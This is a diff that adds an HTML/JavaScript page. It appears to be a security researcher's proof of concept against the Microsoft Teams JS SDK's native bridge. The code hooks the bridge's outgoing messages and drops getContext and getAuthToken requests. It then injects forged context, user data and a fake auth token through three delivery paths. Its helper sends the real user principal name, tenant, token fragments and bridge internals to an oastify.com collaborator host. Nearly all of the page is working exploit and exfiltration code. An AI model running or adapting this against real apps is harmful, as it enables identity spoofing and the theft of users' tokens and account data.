@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Source Spoof</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:55vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#f85149; font-size:11px; }
+  button { background:#21262d; color:#f85149; border:1px solid #f85149; padding:6px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold; }
+  button.g { color:#3fb950; border-color:#3fb950; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:3px; margin:3px 0; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>TEST 20 — SOURCE-LEVEL BRIDGE SPOOF (from JSWebModule.js analysis)</b></div>
+
+<div class="section"><b>SPOOF via window.onNativeMessage (direct SDK delivery)</b></div>
+<div class="grid">
+  <button class="g" onclick="spoofContextDirect()">SPOOF getContext</button>
+  <button class="g" onclick="spoofAuthDirect()">SPOOF getAuthToken</button>
+  <button class="g" onclick="spoofUserDirect()">SPOOF getUser</button>
+</div>
+
+<div class="section"><b>SPOOF via handleResponseFromNative (correct 2-arg format)</b></div>
+<div class="grid">
+  <button class="g" onclick="spoofContextNative()">NATIVE getContext</button>
+  <button class="g" onclick="spoofAuthNative()">NATIVE getAuthToken</button>
+</div>
+
+<div class="section"><b>SPOOF via NI.callbacks direct call</b></div>
+<div class="grid">
+  <button class="g" onclick="spoofCallbackDirect()">CALLBACK getContext</button>
+  <button class="g" onclick="spoofCallbackAuth()">CALLBACK getAuthToken</button>
+</div>
+
+<div class="section"><b>INFO / DEBUG</b></div>
+<div class="grid">
+  <button onclick="dumpBridge()">DUMP BRIDGE</button>
+  <button onclick="dumpOnNativeMessage()">CHECK onNativeMessage</button>
+  <button onclick="captureInit()">RE-CAPTURE INIT</button>
+</div>
+
+<div>
+  <button onclick="copyOut()">COPY</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'u836hcro9tvtgy6noymetbl9k0qreh26.oastify.com';
+var NI = null;
+var origFPM = null;
+var origHandleResponse = null;
+var origOnNativeMessage = null;
+var capturedRequests = [];
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+// ================================================================
+// PHASE 0: Hook EVERYTHING before SDK loads
+//
+// From JSWebModule.js source:
+//   processMessageRequest stores callbacks in NI.callbacks[request.id]
+//   handleResponseFromNative(response, requestId) calls NI.callbacks[requestId](response)
+//   Callback then calls postSdkResponseWithId(window, id, [decoded_data])
+//   postSdkResponse delivers via window.onNativeMessage({data: {id, args}})
+//
+// From BridgeScript.js:
+//   Same pattern but uses UUID: NI.callbacks[uuid || id]
+//   handleResponseFromNative(encoded, isArray, isCallbackReq, reqId, reqUuid, isPartial)
+//   postSdkResponseWithId(window, id, uuid, args)
+//
+// ATTACK: We can deliver fake data via:
+//   1. window.onNativeMessage({data: {id: X, args: [fakeData]}}) — bypasses entire bridge
+//   2. NI.handleResponseFromNative(base64data, requestId) — uses bridge's own callback
+//   3. NI.callbacks[id].call(NI, base64data) — invoke the callback directly
+// ================================================================
+
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  origFPM = NI.framelessPostMessage;
+  origHandleResponse = NI.handleResponseFromNative;
+
+  // Intercept outgoing requests to capture IDs
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      capturedRequests.push({ id: parsed.id, func: parsed.func, uuid: parsed.uuidAsString, time: Date.now() });
+      log('[SDK→NATIVE] id=' + parsed.id + ' uuid=' + (parsed.uuidAsString || 'none') + ' func=' + parsed.func, 'info');
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  log('NI hooked — capturing outgoing request IDs', 'ok');
+}
+
+// ================================================================
+// FAKE DATA OBJECTS
+// ================================================================
+var FAKE_CONTEXT = {
+  teamId: '19:ATTACKER-SPOOFED@thread.tacv2',
+  entityId: '',
+  userPrincipalName: 'SPOOFED-VICTIM@attacker-controlled.com',
+  channelType: 'Regular',
+  teamType: 0,
+  sourceOrigin: '',
+  teamSiteDomain: 'attacker-controlled.sharepoint.com',
+  isTeamArchived: false,
+  subEntityId: null,
+  channelId: '19:ATTACKER-CHANNEL@thread.tacv2',
+  channelName: 'ATTACKER-CHANNEL',
+  tid: 'FAKE-TENANT-AAAA-BBBB-CCCCCCCCCCCC',
+  groupId: 'FAKE-GROUP-1111-2222-333333333333',
+  hostClientType: 'ios',
+  userObjectId: 'FAKE-USER-OBJ-ID',
+  userLicenseType: 'Enterprise',
+  teamName: 'ATTACKER-TEAM',
+  locale: 'en-us',
+  theme: 'default',
+  sessionId: 'SPOOFED-SESSION',
+  ringId: 'ring0',
+  appSessionId: 'SPOOFED-APP-SESSION',
+  isCallingAllowed: true,
+  isPSTNCallingAllowed: true,
+  meetingId: '',
+  chatId: '',
+  isMultiWindow: false,
+  appIconPosition: 0,
+  userClickTime: Date.now(),
+  userFileOpenPreference: 0
+};
+
+var FAKE_TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mYWtlLyIsInN1YiI6ImF0dGFja2VyLXN1YiIsInVwbiI6ImF0dGFja2VyQGV2aWwuY29tIiwic2NwIjoiVXNlci5SZWFkIE1haWwuUmVhZCIsImV4cCI6OTk5OTk5OTk5OX0.ATTACKER-CONTROLLED-SIGNATURE';
+
+var FAKE_USER = {
+  displayName: 'ATTACKER SPOOFED USER',
+  objectId: 'FAKE-USER-OBJ-ID',
+  userPrincipalName: 'SPOOFED-VICTIM@attacker-controlled.com'
+};
+
+// Helper: base64 encode for bridge format
+function b64encode(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+
+// ================================================================
+// METHOD 1: DIRECT window.onNativeMessage
+//
+// This is the FINAL delivery point in the bridge chain.
+// JSWebModule.js line 998: window.onNativeMessage({data: response})
+// If we call this with a matching request ID, the SDK will
+// receive our fake data as if it came from the native host.
+// ================================================================
+
+function spoofContextDirect() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 1: window.onNativeMessage — DIRECT getContext spoof', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getContext id=' + capturedId + ' uuid=' + (parsed.uuidAsString || 'none'), 'crit');
+
+        setTimeout(function() {
+          // From JSWebModule.js getContext callback (line 269-278):
+          //   this.postSdkResponseWithId(sourceWindow, request.id, [context])
+          // Which calls postSdkResponse → window.onNativeMessage({data: {id, args}})
+          //
+          // So the SDK expects: {data: {id: requestId, args: [contextObject]}}
+
+          log('Injecting via window.onNativeMessage...', 'warn');
+
+          // Try with numeric id
+          var payload1 = { data: { id: capturedId, args: [FAKE_CONTEXT] } };
+          log('  Payload: {data: {id: ' + capturedId + ', args: [fakeCtx]}}', 'info');
+
+          try {
+            if (typeof window.onNativeMessage === 'function') {
+              window.onNativeMessage(payload1);
+              log('  onNativeMessage called — no error!', 'ok');
+              ex('t20-onm-context-ok', { id: capturedId });
+            } else {
+              log('  window.onNativeMessage is NOT a function: ' + typeof window.onNativeMessage, 'fail');
+              ex('t20-onm-missing', { type: typeof window.onNativeMessage });
+
+              // Fallback: try with uuidAsString if present
+              if (parsed.uuidAsString) {
+                var payload2 = { data: { id: capturedId, uuidAsString: parsed.uuidAsString, args: [FAKE_CONTEXT] } };
+                log('  Trying with uuidAsString...', 'warn');
+                try {
+                  window.onNativeMessage(payload2);
+                  log('  onNativeMessage with uuid — no error!', 'ok');
+                } catch(e2) {
+                  log('  uuid attempt: ' + e2.message, 'fail');
+                }
+              }
+            }
+          } catch(e) {
+            log('  onNativeMessage error: ' + e.message, 'fail');
+            ex('t20-onm-error', { err: e.message });
+          }
+        }, 50);
+
+        return; // DROP — don't forward to native
+      }
+    } catch(e) {}
+    return _orig.apply(this, arguments);
+  };
+
+  log('Calling microsoftTeams.app.getContext()...', 'info');
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** getContext() RESOLVED ***', 'crit');
+    var upn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
+    var tid = ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A';
+    var team = ctx.team ? ctx.team.displayName : 'N/A';
+    var host = ctx.app ? ctx.app.host.clientType : 'N/A';
+    log('  UPN:    ' + upn, 'crit');
+    log('  Tenant: ' + tid, 'crit');
+    log('  Team:   ' + team, 'crit');
+    log('  Host:   ' + host, 'crit');
+
+    var spoofed = upn.indexOf('SPOOFED') !== -1 || upn.indexOf('attacker') !== -1;
+    if (spoofed) {
+      log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'crit');
+      log('!!! CONFIRMED: SDK RECEIVED ATTACKER DATA   !!!', 'crit');
+      log('!!! window.onNativeMessage SPOOF WORKS      !!!', 'crit');
+      log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'crit');
+      ex('t20-CONTEXT-SPOOF-CONFIRMED', { upn: upn, tenant: tid, team: team, host: host });
+    } else {
+      log('\nSDK got real context — spoof may not have reached SDK', 'warn');
+      ex('t20-context-real', { upn: upn });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+    ex('t20-context-error', { err: e.message });
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+function spoofAuthDirect() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 1: window.onNativeMessage — AUTH TOKEN spoof', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'authentication.getAuthToken' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getAuthToken id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          // From JSWebModule.js (line 353-379):
+          // getAuthToken callback calls postSdkResponseWithId with:
+          //   [true, token] on success
+          //   [false, reason] on failure
+          //
+          // So SDK expects: {data: {id: X, args: [true, "token_string"]}}
+
+          log('Injecting fake token via onNativeMessage...', 'warn');
+
+          var payload = { data: { id: capturedId, args: [true, FAKE_TOKEN] } };
+
+          try {
+            if (typeof window.onNativeMessage === 'function') {
+              window.onNativeMessage(payload);
+              log('  onNativeMessage called — no error!', 'ok');
+              ex('t20-onm-auth-ok', { id: capturedId });
+            } else {
+              log('  onNativeMessage not a function', 'fail');
+            }
+          } catch(e) {
+            log('  error: ' + e.message, 'fail');
+          }
+        }, 50);
+
+        return; // DROP
+      }
+    } catch(e) {}
+    return _orig.apply(this, arguments);
+  };
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('\n*** getAuthToken() RESOLVED ***', 'crit');
+    log('  Token (first 120): ' + String(token).substring(0, 120), 'crit');
+
+    var fake = String(token).indexOf('ATTACKER-CONTROLLED') !== -1;
+    if (fake) {
+      log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'crit');
+      log('!!! CONFIRMED: SDK ACCEPTED FAKE AUTH TOKEN !!!', 'crit');
+      log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'crit');
+      ex('t20-AUTH-SPOOF-CONFIRMED', { token: String(token).substring(0, 300) });
+    } else {
+      log('SDK got real/different token', 'warn');
+      ex('t20-auth-real', { token: String(token).substring(0, 100) });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('getAuthToken error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+function spoofUserDirect() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 1: window.onNativeMessage — getUser spoof', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'authentication.getUser' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getUser id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          // getUser callback: postSdkResponseWithId(window, id, [true, userObj])
+          var payload = { data: { id: capturedId, args: [true, FAKE_USER] } };
+          try {
+            window.onNativeMessage(payload);
+            log('  Injected fake user', 'ok');
+          } catch(e) {
+            log('  error: ' + e.message, 'fail');
+          }
+        }, 50);
+
+        return;
+      }
+    } catch(e) {}
+    return _orig.apply(this, arguments);
+  };
+
+  // getUser is an older API — try it
+  try {
+    microsoftTeams.getUser(function(user) {
+      log('getUser result: ' + JSON.stringify(user).substring(0, 200), 'crit');
+    });
+  } catch(e) {
+    log('getUser not available: ' + e.message, 'warn');
+  }
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 8000);
+}
+
+
+// ================================================================
+// METHOD 2: handleResponseFromNative with correct args
+//
+// JSWebModule.js line 1049:
+//   handleResponseFromNative(response, requestId)
+//   → callback = this.callbacks[requestId]
+//   → callback(response) — response is base64-encoded string
+//
+// BridgeScript.js line 144:
+//   handleResponseFromNative(encodedResponse, isResponseinArray,
+//     isCallbackRequired, requestId, requestUuid, isPartialResponse)
+// ================================================================
+
+function spoofContextNative() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 2: handleResponseFromNative — getContext', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var capturedUuid = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        capturedUuid = parsed.uuidAsString;
+        log('BLOCKED getContext id=' + capturedId + ' uuid=' + (capturedUuid || 'none'), 'crit');
+
+        setTimeout(function() {
+          // For getContext callback (line 269):
+          //   callback receives base64-encoded JSON string
+          //   It decodes and wraps: postSdkResponseWithId(window, id, [context])
+          var encoded = b64encode(JSON.stringify(FAKE_CONTEXT));
+
+          // Try JSWebModule format: handleResponseFromNative(response, requestId)
+          log('Trying JSWebModule format (2 args)...', 'warn');
+          try {
+            origHandleResponse.call(NI, encoded, capturedId);
+            log('  JSWebModule format → no error!', 'ok');
+            ex('t20-hrfn-jsw-ok', { id: capturedId });
+          } catch(e) {
+            log('  JSWebModule format → ' + e.message, 'fail');
+
+            // Try BridgeScript format: 6 args
+            log('Trying BridgeScript format (6 args)...', 'warn');
+            try {
+              var bsEncoded = b64encode(JSON.stringify(FAKE_CONTEXT));
+              origHandleResponse.call(NI, bsEncoded, 'false', 'true',
+                capturedId, capturedUuid || '', 'false');
+              log('  BridgeScript format → no error!', 'ok');
+              ex('t20-hrfn-bs-ok', { id: capturedId });
+            } catch(e2) {
+              log('  BridgeScript format → ' + e2.message, 'fail');
+
+              // Try with uuid as the lookup key
+              if (capturedUuid) {
+                log('Trying with uuid as key...', 'warn');
+                try {
+                  origHandleResponse.call(NI, encoded, capturedUuid.toLowerCase());
+                  log('  UUID lookup → no error!', 'ok');
+                  ex('t20-hrfn-uuid-ok', { uuid: capturedUuid });
+                } catch(e3) {
+                  log('  UUID lookup → ' + e3.message, 'fail');
+                }
+              }
+            }
+          }
+        }, 50);
+
+        return; // DROP
+      }
+    } catch(e) {}
+    return _orig.apply(this, arguments);
+  };
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** getContext() RESOLVED ***', 'crit');
+    var upn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
+    log('  UPN: ' + upn, 'crit');
+    if (upn.indexOf('SPOOFED') !== -1) {
+      log('!!! handleResponseFromNative SPOOF CONFIRMED !!!', 'crit');
+      ex('t20-HRFN-CONTEXT-CONFIRMED', { upn: upn });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+function spoofAuthNative() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 2: handleResponseFromNative — getAuthToken', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'authentication.getAuthToken' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getAuthToken id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          // getAuthToken callback (line 353-379):
+          //   result is a string — tries base64 decode
+          //   If decoded JSON has 'token' key → postSdkResponseWithId(window, id, [true, token])
+          //   If decode fails → treats result as raw token → [true, result]
+          //
+          // Simplest: pass raw token string (case 2 in source)
+          // The catch(e) block does: postSdkResponseWithId(window, id, [true, result])
+
+          log('Injecting fake token via handleResponseFromNative...', 'warn');
+
+          // Just pass the raw token — decode will fail, catch block returns [true, rawToken]
+          try {
+            origHandleResponse.call(NI, FAKE_TOKEN, capturedId);
+            log('  Raw token inject → no error!', 'ok');
+            ex('t20-hrfn-auth-ok', { id: capturedId });
+          } catch(e) {
+            log('  Raw token → ' + e.message, 'fail');
+
+            // Try base64({token: fakeToken})
+            try {
+              var encoded = b64encode(JSON.stringify({ token: FAKE_TOKEN }));
+              origHandleResponse.call(NI, encoded, capturedId);
+              log('  Base64 token obj → no error!', 'ok');
+            } catch(e2) {
+              log('  Base64 token obj → ' + e2.message, 'fail');
+            }
+          }
+        }, 50);
+
+        return;
+      }
+    } catch(e) {}
+    return _orig.apply(this, arguments);
+  };
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('\n*** getAuthToken() RESOLVED ***', 'crit');
+    log('  Token: ' + String(token).substring(0, 120), 'crit');
+    if (String(token).indexOf('ATTACKER') !== -1) {
+      log('!!! handleResponseFromNative AUTH SPOOF CONFIRMED !!!', 'crit');
+      ex('t20-HRFN-AUTH-CONFIRMED', { token: String(token).substring(0, 200) });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+// ================================================================
+// METHOD 3: Direct NI.callbacks[id] invocation
+// ================================================================
+
+function spoofCallbackDirect() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 3: NI.callbacks[id] — direct callback call', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var capturedUuid = null;
+  var _orig = NI.framelessPostMessage;
+
+  // Let the request go through to native (DON'T block)
+  // but capture the ID so we can call the callback
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext') {
+        capturedId = parsed.id;
+        capturedUuid = parsed.uuidAsString;
+        log('Captured getContext id=' + capturedId + ' uuid=' + (capturedUuid || 'none'), 'crit');
+        log('Letting native handle it, but we will ALSO inject...', 'warn');
+      }
+    } catch(e) {}
+    // Forward to native — let it respond normally
+    var result = _orig.apply(this, arguments);
+
+    // After a tiny delay, try to call the callback ourselves
+    // This is a RACE: can we call it before native does?
+    if (capturedId !== null && !spoofCallbackDirect._tried) {
+      spoofCallbackDirect._tried = true;
+      setTimeout(function() {
+        var lookupKey = capturedUuid ? capturedUuid.toLowerCase() : capturedId;
+
+        log('\nLooking up NI.callbacks[' + lookupKey + ']...', 'warn');
+        var cb = NI.callbacks[lookupKey];
+
+        if (cb) {
+          log('  Callback EXISTS! type=' + typeof cb, 'crit');
+
+          // Call it with fake data (base64 encoded context)
+          var encoded = b64encode(JSON.stringify(FAKE_CONTEXT));
+          try {
+            cb.call(NI, encoded);
+            log('  Callback invoked with fake data!', 'crit');
+            ex('t20-cb-direct-ok', { id: capturedId, key: String(lookupKey) });
+          } catch(e) {
+            log('  Callback error: ' + e.message, 'fail');
+            ex('t20-cb-direct-err', { err: e.message });
+          }
+        } else {
+          log('  Callback NOT found at key=' + lookupKey, 'warn');
+          log('  Available keys: ' + Object.keys(NI.callbacks).join(', '), 'info');
+          ex('t20-cb-missing', { key: String(lookupKey), keys: Object.keys(NI.callbacks).join(',') });
+
+          // Try all keys
+          var keys = Object.keys(NI.callbacks);
+          for (var i = 0; i < keys.length; i++) {
+            log('  Trying key: ' + keys[i], 'info');
+          }
+        }
+      }, 10); // 10ms — try before native responds
+    }
+
+    return result;
+  };
+  spoofCallbackDirect._tried = false;
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** getContext() RESOLVED ***', 'crit');
+    var upn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
+    log('  UPN: ' + upn, 'crit');
+    if (upn.indexOf('SPOOFED') !== -1 || upn.indexOf('attacker') !== -1) {
+      log('!!! DIRECT CALLBACK SPOOF CONFIRMED !!!', 'crit');
+      ex('t20-CB-CONTEXT-CONFIRMED', { upn: upn });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+function spoofCallbackAuth() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('METHOD 3: NI.callbacks[id] — auth token callback', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var capturedId = null;
+  var _orig = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'authentication.getAuthToken') {
+        capturedId = parsed.id;
+        log('Captured getAuthToken id=' + capturedId, 'crit');
+      }
+    } catch(e) {}
+    var result = _orig.apply(this, arguments);
+
+    if (capturedId !== null && !spoofCallbackAuth._tried) {
+      spoofCallbackAuth._tried = true;
+      setTimeout(function() {
+        var cb = NI.callbacks[capturedId];
+        if (cb) {
+          log('Auth callback EXISTS!', 'crit');
+          // Pass raw fake token — catch block in callback returns [true, rawToken]
+          try {
+            cb.call(NI, FAKE_TOKEN);
+            log('  Auth callback invoked!', 'crit');
+            ex('t20-cb-auth-ok', { id: capturedId });
+          } catch(e) {
+            log('  error: ' + e.message, 'fail');
+          }
+        } else {
+          log('Auth callback not found', 'warn');
+        }
+      }, 10);
+    }
+
+    return result;
+  };
+  spoofCallbackAuth._tried = false;
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('\n*** getAuthToken() RESOLVED ***', 'crit');
+    log('  Token: ' + String(token).substring(0, 120), 'crit');
+    if (String(token).indexOf('ATTACKER') !== -1) {
+      log('!!! DIRECT CALLBACK AUTH SPOOF CONFIRMED !!!', 'crit');
+      ex('t20-CB-AUTH-CONFIRMED', { token: String(token).substring(0, 200) });
+    }
+    NI.framelessPostMessage = _orig;
+  }).catch(function(e) {
+    log('error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _orig;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
+}
+
+
+// ================================================================
+// DEBUG / INFO
+// ================================================================
+
+function dumpBridge() {
+  log('\n=== BRIDGE DUMP ===', 'info');
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  var props = Object.getOwnPropertyNames(NI);
+  log('NI has ' + props.length + ' properties', 'info');
+
+  // Check which bridge version is loaded
+  var hasBridgeScript = NI.postSdkResponseWithId && NI.postSdkResponseWithId.length === 4;
+  var hasJSWebModule = NI.postSdkResponseWithId && NI.postSdkResponseWithId.length === 3;
+  log('postSdkResponseWithId.length = ' + (NI.postSdkResponseWithId ? NI.postSdkResponseWithId.length : 'N/A'), 'crit');
+  log('Bridge type: ' + (hasBridgeScript ? 'BridgeScript (4 args, UUID)' : hasJSWebModule ? 'JSWebModule (3 args, numeric)' : 'UNKNOWN'), 'crit');
+
+  // handleResponseFromNative signature
+  log('handleResponseFromNative.length = ' + (NI.handleResponseFromNative ? NI.handleResponseFromNative.length : 'N/A'), 'crit');
+
+  // Callbacks
+  var cbKeys = Object.keys(NI.callbacks || {});
+  log('NI.callbacks: ' + cbKeys.length + ' keys [' + cbKeys.join(', ') + ']', cbKeys.length > 0 ? 'crit' : 'warn');
+
+  // Handlers
+  var hKeys = Object.keys(NI.handlers || {});
+  log('NI.handlers: ' + hKeys.length + ' keys [' + hKeys.join(', ') + ']', hKeys.length > 0 ? 'crit' : 'info');
+
+  // window.onNativeMessage
+  log('window.onNativeMessage: ' + typeof window.onNativeMessage, typeof window.onNativeMessage === 'function' ? 'crit' : 'warn');
+
+  ex('t20-bridge-dump', {
+    props: props.length,
+    psdriLen: NI.postSdkResponseWithId ? NI.postSdkResponseWithId.length : -1,
+    hrfnLen: NI.handleResponseFromNative ? NI.handleResponseFromNative.length : -1,
+    cbKeys: cbKeys.join(','),
+    hKeys: hKeys.join(','),
+    onNativeMsg: typeof window.onNativeMessage
+  });
+}
+
+function dumpOnNativeMessage() {
+  log('\n=== window.onNativeMessage CHECK ===', 'info');
+  log('typeof: ' + typeof window.onNativeMessage, typeof window.onNativeMessage === 'function' ? 'crit' : 'warn');
+
+  if (typeof window.onNativeMessage === 'function') {
+    log('Source: ' + String(window.onNativeMessage).substring(0, 300), 'info');
+    ex('t20-onm-exists', { src: String(window.onNativeMessage).substring(0, 500) });
+  } else {
+    log('NOT AVAILABLE — SDK may use a different message handler', 'warn');
+    // Check for alternatives
+    var alts = ['onNativeMessage', 'onmessage', 'teamsMessage', '_onNativeMessage'];
+    for (var i = 0; i < alts.length; i++) {
+      if (typeof window[alts[i]] === 'function') {
+        log('  window.' + alts[i] + ' EXISTS!', 'crit');
+      }
+    }
+  }
+}
+
+function captureInit() {
+  log('\n=== Re-capturing init data ===', 'info');
+  log('Captured requests so far: ' + capturedRequests.length, 'info');
+  for (var i = 0; i < capturedRequests.length; i++) {
+    var r = capturedRequests[i];
+    log('  [' + i + '] id=' + r.id + ' uuid=' + (r.uuid || 'none') + ' func=' + r.func, 'info');
+  }
+  log('NI.callbacks keys: ' + Object.keys(NI.callbacks || {}).join(', '), 'crit');
+}
+
+
+// ================================================================
+// SDK INIT
+// ================================================================
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      var ctx = await microsoftTeams.app.getContext();
+      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? Object.getOwnPropertyNames(NI).length + ' props' : 'MISSING'), NI ? 'ok' : 'fail');
+      log('onNativeMessage: ' + typeof window.onNativeMessage, typeof window.onNativeMessage === 'function' ? 'ok' : 'warn');
+      log('\nReady. Run DUMP BRIDGE first, then spoof methods.', 'ok');
+      log('Method 1 (onNativeMessage) is most likely to work.', 'warn');
+
+      ex('t20-init', {
+        user: ctx.user.userPrincipalName,
+        host: ctx.app.host.clientType,
+        ni: !!NI,
+        onNM: typeof window.onNativeMessage,
+        requests: capturedRequests.length
+      });
+    } catch(e) {
+      log('SDK init error: ' + e.message, 'fail');
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+</script>
+</body>
+</html>
